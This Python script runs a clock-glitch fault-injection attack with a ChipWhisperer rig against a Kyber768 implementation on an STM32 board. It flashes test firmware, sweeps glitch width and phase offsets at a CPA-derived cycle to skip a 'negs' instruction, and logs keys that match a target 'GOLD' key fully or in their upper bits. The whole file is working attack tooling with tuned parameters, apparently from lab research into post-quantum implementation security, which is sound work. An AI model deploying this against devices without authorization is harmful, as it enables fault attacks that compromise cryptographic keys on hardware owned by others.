#!/usr/bin/env python3
"""
Clock Glitch Attack for Kyber768 (Negs Instruction)
Uses CPA-derived parameters from 24 MHz analysis.

Target: negs instruction at cycle 95 (ext_offset=95)
Mode: Clock XOR (clock_xor)
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import sys
from datetime import datetime
import argparse

FW_PATH = "bin/test_glitch.hex"

# Default parameters - override with --ext_offset from CPA
DEFAULT_EXT_OFFSET = 95  # From 24 MHz CPA analysis

# Extended ranges for finding the window
# 1. Width: PRECISION SWEEP at transition zone
#    Range: 4.0% to 5.5%, Step: 0.05% (Very fine)
WIDTH_OPTIONS = np.arange(4.0, 5.5, 0.05) 

# 2. Ext Offset: Locked to SUCCESS location (22 ONLY)
EXT_OFFSET_RANGE = [-73] # Absolute: 22

FINE_OFFSET_RANGE = np.arange(-45.0, 45.0, 0.5)  # Phase shift
FINE_OFFSET_RANGE = FINE_OFFSET_RANGE[FINE_OFFSET_RANGE != 0.0]
MAX_ATTEMPTS = 50000


def setup(args):
    """Initialize ChipWhisperer for clock glitching."""
    print("="*60, flush=True)
    print("CLOCK GLITCH ATTACK (Negs Instruction)", flush=True)
    print("="*60, flush=True)
    
    scope = cw.scope()
    target = cw.target(scope)
    
    # Manual setup (avoid default_setup which resets clock)
    scope.gain.db = 25
    scope.adc.samples = 5000
    scope.adc.offset = 0
    scope.adc.basic_mode = "rising_edge"
    scope.trigger.triggers = "tio4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.io.hs2 = "clkgen"  # Start with normal clock for programming
    
    scope.clock.clkgen_freq = 24000000
    time.sleep(0.5)
    if scope.clock.clkgen_freq < 20000000:
        print(f"ERROR: Clock failed to set to 24MHz. Got: {scope.clock.clkgen_freq}", flush=True)
        sys.exit(1)
    
    scope.clock.adc_src = "clkgen_x4"
    target.baud = 38400
    
    # Clock Glitch configuration
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"  # Clock glitch (not voltage)
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = False  # Disable voltage glitching
    scope.io.glitch_hp = False  # Disable voltage glitching
    scope.glitch.repeat = 1
    
    scope.glitch.ext_offset = args.ext_offset
    
    return scope, target


def reset(scope, target):
    """Reset the target device with improved reliability."""
    scope.io.nrst = 'low'
    time.sleep(0.1)
    scope.io.nrst = 'high'
    time.sleep(0.1)
    scope.io.nrst = 'high_z'
    
    t = time.time()
    buff = ""
    while time.time() - t < 1.0:
        if target.in_waiting():
            buff += target.read()
            if "WAIT" in buff:
                return True, buff
        time.sleep(0.01)
    return False, buff


def glitch(scope, target, target_key, baseline_key, width, offset):
    """Execute a single clock glitch attempt."""
    scope.glitch.width = width
    scope.glitch.offset = offset
    
    # Wait for next WAIT
    r = ""
    t = time.time()
    while time.time() - t < 0.2:
        if target.in_waiting():
            r += target.read()
            if "WAIT" in r:
                break
    
    if "WAIT" not in r:
        return "timeout", None, None
    
    scope.arm()
    if scope.capture():
        return "no_trig", None, None
    
    # Wait for response (Robust)
    r = ""
    t = time.time()
    # Giving slightly more time for serial to arrive (0.2s)
    while time.time() - t < 0.2:
        if target.in_waiting():
            r += target.read()
            
        if "KEY:" in r:
             # Check if we have the full key token
             tokens = r.split()
             k_idx = tokens.index("KEY:")
             if k_idx + 1 < len(tokens):
                 candidate = tokens[k_idx+1]
                 if len(candidate) == 64:
                     break
        time.sleep(0.001)
    
    if target_key in r:
        return "SUCCESS", scope.get_last_trace(), target_key
    elif baseline_key in r:
        return "normal", None, baseline_key
    elif "KEY:" in r:
        idx = r.find("KEY:") + 4
        key = r[idx:idx+70].strip().split()[0] if len(r) > idx else "?"
        
        # Check for Partial Match (Negs Skip Effect)
        # If TOP 7 bits match GOLD, but LSB matches Rejection (or is just flipped)
        if check_dirty_match(key, target_key):
             return "success_dirty", scope.get_last_trace(), key
             
        return "different", None, key
    else:
        return "crash", None, None


def check_dirty_match(key_hex, gold_hex):
    """Check if key matches gold on top 7 bits of every byte."""
    try:
        if len(key_hex) != len(gold_hex): return False
        k = bytes.fromhex(key_hex)
        g = bytes.fromhex(gold_hex)
        
        diff_count = 0
        for i in range(len(k)):
            # If high 7 bits match, it's a candidate for the glitch effect
            if (k[i] & 0xFE) != (g[i] & 0xFE):
                 return False # High bits mismatch, totally different key
            
            if k[i] != g[i]:
                diff_count += 1
        
        # If we get here, all high bits match!
        # If diff_count > 0, it means LSBs caused the difference -> SUCCESS DIRTY
        return True
    except ValueError:
        return False


def load_cpa_params(cpa_dir="cpa_results_24mhz"):
    """Load recommended parameters from CPA analysis."""
    param_file = f"{cpa_dir}/recommended_params.txt"
    if os.path.exists(param_file):
        params = {}
        with open(param_file) as f:
            for line in f:
                if "=" in line:
                    key, val = line.strip().split("=", 1)
                    params[key] = val
        return params
    return None


def main():
    parser = argparse.ArgumentParser(description='Clock glitch attack on negs instruction')
    parser.add_argument('--ext_offset', type=int, default=None, 
                        help='Fixed ext_offset from CPA')
    parser.add_argument('--max_attempts', type=int, default=MAX_ATTEMPTS, help='Maximum attempts')

    args = parser.parse_args()
    
    cpa_params = load_cpa_params()
    if args.ext_offset is None:
        if cpa_params and 'ext_offset' in cpa_params:
            args.ext_offset = int(cpa_params['ext_offset'])
            print(f"Loaded ext_offset={args.ext_offset} from CPA analysis", flush=True)
        else:
            args.ext_offset = DEFAULT_EXT_OFFSET
            print(f"Using default ext_offset={args.ext_offset}", flush=True)
    
    scope, target = setup(args)
    
    print(f"Programming {FW_PATH}...", flush=True)
    cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
    print("OK", flush=True)
    
    # NOW switch to glitch mode for the attack
    scope.io.hs2 = "glitch"  # Target clock driven by glitch module
    time.sleep(0.1)
    
    res_ok, out = reset(scope, target)
    if not res_ok:
        print("ERROR: Target failed to initialize!", flush=True)
        print(f"Received: {repr(out)}", flush=True)
        scope.dis(); return
    
    # Wait for keys with robust buffering
    t = time.time()
    while time.time() - t < 5.0:
        if target.in_waiting():
            out += target.read()
            
        # Parse output to check if we have the keys
        # We expect: KEY: \n <64-char-hex> \n
        if "KEY:" in out and "GOLD:" in out:
            tokens = out.split()
            # Find index of KEY:
            if "KEY:" in tokens:
                k_idx = tokens.index("KEY:")
                if k_idx + 1 < len(tokens):
                    candidate_key = tokens[k_idx+1]
                    if len(candidate_key) == 64:
                        break
        time.sleep(0.01)
    
    if "GOLD:" not in out:
        print("ERROR: No GOLD key!", flush=True)
        print(f"Output: {repr(out)}", flush=True)
        scope.dis(); return
    
    if "KEY:" not in out:
        print("ERROR: No baseline KEY!", flush=True)
        scope.dis(); return
    
    # Robust parsing
    tokens = out.split()
    
    try:
        g_idx = tokens.index("GOLD:")
        target_key = tokens[g_idx+1]
        
        k_idx = tokens.index("KEY:")
        baseline_key = tokens[k_idx+1]
        
        if len(target_key) != 64 or len(baseline_key) != 64:
             raise ValueError("Key length mismatch")
             
    except (ValueError, IndexError) as e:
        print(f"ERROR: Failed to parse keys: {e}", flush=True)
        print(f"Buffer: {repr(out)}", flush=True)
        scope.dis(); return
    
    print(f"DEBUG: Startup Buffer:\n{out}\n", flush=True)
    
    print(f"TARGET (GOLD): {target_key[:40]}...", flush=True)
    print(f"BASELINE:      {baseline_key[:40]}...", flush=True)
    
    print(f"\nCLOCK GLITCH PARAMETERS:", flush=True)
    print(f"  ext_offset: {args.ext_offset} (FIXED from CPA)", flush=True)
    print(f"  width:      {WIDTH_OPTIONS} (% of clock cycle)", flush=True)
    print(f"  offset:     {FINE_OFFSET_RANGE[0]:.1f} to {FINE_OFFSET_RANGE[-1]:.1f}", flush=True)
    print(f"Started:      {datetime.now()}", flush=True)
    print("="*60, flush=True)
    
    os.makedirs("traces_precision", exist_ok=True)
    
    total = crashes = timeouts = normal = different = no_trig = 0
    consecutive_timeouts = 0
    
    try:
        while total < args.max_attempts:
            # Sweep ext_offset around the CPA peak
            for rel_off in EXT_OFFSET_RANGE:
                current_ext_offset = args.ext_offset + rel_off
                scope.glitch.ext_offset = current_ext_offset
                
                for w in WIDTH_OPTIONS:
                    for off in FINE_OFFSET_RANGE:
                        total += 1
                        
                        res, trace, key = glitch(scope, target, target_key, baseline_key, w, off)
                        
                        if res == "different":
                            consecutive_timeouts = 0
                            different += 1
                            if different % 100 == 0: # Print every 100th different key to sample corruption
                                 print(f"\n[DEBUG] Diff Sample: {key}", flush=True)
                            # Force reset to clear any state corruption/latched faults
                            reset(scope, target)
                        
                        elif res == "SUCCESS" or res == "success_dirty":
                            print(f"\n*** SUCCESS! ({res}) attempts={total} ***", flush=True)
                            print(f"ext_offset={current_ext_offset}, width={w}, offset={off}", flush=True)
                            print(f"Key: {key}", flush=True)
                            np.save(f"traces_precision/SUCCESS_CLOCK_e{current_ext_offset}_w{w}_o{off}.npy", trace)
                            with open("KYBER_CLOCK_SUCCESS.txt", "w") as f:
                                f.write(f"SUCCESS ({res})!\next_offset={current_ext_offset}\nwidth={w}\noffset={off}\nattempts={total}\nkey={key}\n")
                            scope.dis(); return
                        
                        elif res == "normal":
                            normal += 1
                            consecutive_timeouts = 0
                        elif res == "crash":
                            crashes += 1
                            consecutive_timeouts = 0
                            reset(scope, target)
                        elif res == "timeout":
                            timeouts += 1
                            consecutive_timeouts += 1
                            if consecutive_timeouts > 10:
                                print("\nFATAL: Sync lost. Restarting target...", flush=True)
                                res_ok, _ = reset(scope, target)
                                if not res_ok:
                                    print("FATAL: Target is dead. Plug/Unplug required.", flush=True)
                                    scope.dis(); return
                                consecutive_timeouts = 0
                            else:
                                reset(scope, target)
                        elif res == "no_trig":
                            no_trig += 1
                            reset(scope, target)
                        
                        if total % 25 == 0:
                            print(".", end="", flush=True)
                        if total % 250 == 0:
                            print(f" {total} | T:{timeouts} C:{crashes} D:{different} | ext:{current_ext_offset}", flush=True)
            
            # Print newline after full offset sweep cycle
            print(f" [Sweep Cycle Complete]", flush=True)
        
        print(f"\nNo success after {total} attempts.", flush=True)
    
    except KeyboardInterrupt:
        print(f"\nStopped at {total}", flush=True)
    finally:
        try:
            scope.dis(); target.dis()
        except:
            pass


if __name__ == "__main__":
    main()
